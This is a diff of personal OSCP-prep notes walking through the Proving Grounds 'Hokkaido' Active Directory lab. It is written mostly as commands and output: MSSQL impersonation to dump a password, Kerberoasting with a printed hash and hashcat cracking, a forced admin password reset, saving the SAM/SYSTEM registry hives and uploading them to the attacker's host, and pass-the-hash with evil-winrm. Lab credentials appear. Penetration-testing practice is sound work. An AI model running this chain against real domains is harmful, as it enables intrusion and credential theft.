@@ -3,6 +3,12 @@ Links:
 https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491
 https://aditya-3.gitbook.io/oscp/readme/walkthroughs/pg-practice/hokkaido
 ```
+Standard enum:
+- NMAP
+- Enum4linux
+- kerbrute (AD)
+- crackmapexec (SMB)
+
 # NMAP
 ```bash
 nmap -p- -sCV hokkaido.pgp --open
@@ -14,12 +20,12 @@ Host is up (0.053s latency).
 Not shown: 65501 closed tcp ports (reset)
 PORT      STATE SERVICE       VERSION
 53/tcp    open  domain        Simple DNS Plus
-==80==/tcp    open  http          Microsoft IIS httpd 10.0
+80/tcp    open  http          Microsoft IIS httpd 10.0
 | http-methods: 
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
 |_http-title: IIS Windows Server
-==88==/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-30 21:23:03Z)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-30 21:23:03Z)
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
@@ -37,9 +43,7 @@ PORT      STATE SERVICE       VERSION
 | Not valid before: 2023-12-07T13:54:18
 |_Not valid after:  2024-12-06T13:54:18
 |_ssl-date: 2025-09-30T21:24:08+00:00; 0s from scanner time.
-#################################################################
 1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
-#################################################################
 |ms-sql-ntlm-info: |   192.168.166.40:1433: 
 |     Target_Name: HAERO
 |     NetBIOS_Domain_Name: HAERO
@@ -151,11 +155,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 95.40 seconds
 ```
 
-- windows machine, check HTTP/LDAP/KERBRUTE/ENUM4LINUX/SMBCLIENT
-
-# worth checking:
+# Worth checking:
 ```bash
+80/443 - HTTP
+139,445 - SMB
+389,636, 3268, 3269 - SMB
 1433/tcp  open  ms-sql-s
+3389 - RDP 
+5985 - WinRM
 8531/tcp  open  unknown
 ```
 
@@ -312,10 +319,11 @@ ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able
 
 so we have an issue, check who can we inpersonate
 
+```bash
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
-
+```
 so lets do it: 
-
+```bash
 EXECUTE AS LOGIN = 'hrappdb-reader' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
 
 check if works:
@@ -325,41 +333,52 @@ SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
 TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
 -------------   ------------   ----------   ----------   
 hrappdb         dbo            sysauth      b'BASE TABLE'   
-
+```
 
 Yess!!! now check table
+
+```bash
 SQL (hrappdb-reader  guest@master)> select * from hrappdb.dbo.sysauth;
 id   name               password           
 --   ----------------   ----------------   
  0   b'hrapp-service'   b'Untimed$Runny'   
+```
 
 We have new pass
 'hrapp-service':'Untimed$Runny'
 
 
 try bloodhound
+```bash
 sudo bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.238.40
 (had to provide ip)
+```
 
 locate our account and check outbound Object Control
 
 We ahve GenericWrite over Hazel.Green
 
 Lets Get hashes!
-
+```bash
 ./targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip hokkaido.pgp
 Printing hash for (Hazel.Green)
 $krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$fc0b2ab50d250f8fd32ff518816192ee$bcb8ad1c70fa6b9905d6dac925dad129d2d7dbeed2da6416d25fa254c587b958cc503f481e8eaf01d47590ef72faa67c3eca0944d3b2dab48c869b204ff200baf95bf0af097c87bdc69fbdcf06a52c795a3f3d19ff8de891d5c0be7d3336132ccec8a5d823f1b1f1ab1e8761b15a5b0c11d4eabdc8a4ba14508637b7c4d464445d098f81200e34edf2299889bb7d9986c37b5f7bd3c64fb210758016d7536b216c790189a8b269b3bb5647b0094766bb0237352c2c2d417e9c46c615b768f2e7a86b9ab37a6a02185d0b86f7f9a9629b00e3d71324dd6983be88f8bf08b0164a0a1814cb975432ed45e4f608535435112650b2f5a16c0b08b0450c7ef92abb03dc8c92b34af18284f118d3973e17293330410342c7d77f48aa66dbff677bbc51423ab6a3f1f91c19f276a64bfd621ca6c61e5b2af19b39877511cf34b230e98443a850487924b56e9c0e486934d16bcf5b8ae4a469c3e6fb56f2fa30657e7bb8e619f63a3c292e2cb3c74c219a903bedc168f0ad4da88f057208211a8cf62771a59602322e902dccf8c44445b1e62485a89c139c5724e2068fa535bb39fc91672aff863139e4d7413b6303ad56a9c33b77349cbceab2886b26c070ea140101f6ae8e933b16f654c81ace12d3bf75d43fe9e9ca477a6bf4b7dd789f6935d53ba2f6935366a30b0c385c1f2be7512f5a79d359bb2de0ba169ecb4f3189729404e460a6cc87667701763118bdd5fc6ed7114ad1de307af8b4a1d3d75947d68bf5e39ab1cdcc911d89113d2f26f561f0a6e42602724a3f496cc08af5acbf63e06e04c6787661f29a033ea53aa83dbbf0cecb7c3afeb98f9a3596eb47c26b0329b8c3f10c113fbf8de75cbedd44ee94c0642f20c374bfe6bc02225c0288508ae7dfdd9361f9550834e0ce3421cac6a5649feb89282d6bf0646e73d4f0d27f53d07d0a5601343c620d247f45992484bb2e761fd718487a6da96ddce859b1fcb63932c1611bad02e6a822b11319776337590fe4b14cf714bba0f7dca3f13aaa1259aa70c96ad102b6248d0b8e25d594653f8f4fc47d33fcc19b80737673d05920f6960e4834cde86ba465a4a0d6cfb62b435a88145cba6f6207309dadeb46dca1d1a8cf3f1371a85a6fe9cb2606beb4b3ff3a55784b38491252cebc2fbf79c3433407392315313ff7f733b068ae596fc33dfa5edd054265c13e48ba3c70175ebe5efbee13557259c1de25be82f4f8340e390a488d1692c89a866678de46ae1cb1012c55332d60076118453510a68926f25e780f143bdd5a614c9bcb1301d30db06b5e6f6e5c6f7d46c3c6dd27b4d6dd097e94bda39717dd92096fa49b19bb62b49d06fac83465e02b3268b7fda157a1e8215ebc5be64744e3e24f13e0c852ad1e5f43c643a303de19a4fcfdbcaa729f47a2012ea874a90a14bb8f512a6100e6b40f65704b5a204e36679d4cb55a6554bcafd879fc0c07a366abc7633658cdc905da091ead11d28a95ca33485f95a76a9d4b96c971d885d0fca89307cbbbad7f1f34bcc0e61abe223cd88ee5206e85376ed266f17760892f89e2e11edf4efe29002040e375478ebc150558bde3ea01ce0506711a42ecb77bdd6facaf4e3f66ac9260caab07e6c386d416781da193fc71
+```
+crack the hash
 
+```bash
 hashcat -m 13100 hazel2 /usr/share/wordlists/rockyou.txt --force --potfile-disable 
 
 haze1988
-
-Bloodhound (new IP. one day after)
+```
+Bloodhound again(new IP. one day after)
+```bash
 bloodhound-python -u "Hazel.Green" -p 'haze1988' -d hokkaido-aerospace.com -c all --zip -ns 192.168.207.40
+```
 
 Hazel is member of IT group, has ForceChangePassword of Tier1 admin Molly smith (Outbound object control confirmed in pathfinding)
 
+```bash
 net rpc password "molly.smith" "Password123@" -U "192.168.207.40"/"Hazel.Green"%"haze1988" -S "192.168.207.40"
 
 rpcclient -N  192.168.208.40 -U 'hazel.green%haze1988'
@@ -372,10 +391,11 @@ Pwnded!
 
 connect:
 xfreerdp3 /u:molly.smith /p:'Password123@' /v:192.168.207.40
-
+```
 
 
 check:
+```bash
 whoami 
 whoami /priv
 
@@ -383,9 +403,11 @@ SeChangeNotifyPrivilege Enabled!
 
 reg save hklm\sam c:\Users\molly.smith\sam
 reg save hklm\system c:\Users\molly.smith\system
+```
 
 
-
+last touch:
+```bash
 upload into tun0
 192.168.45.234:8000/upload
 
@@ -401,4 +423,4 @@ evil-winrm -i 192.168.207.40  -u administrator -H "d752482897d54e239376fddb2a210
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
 63c4d767b4812c4c2d47b66cd2977325
-
+```
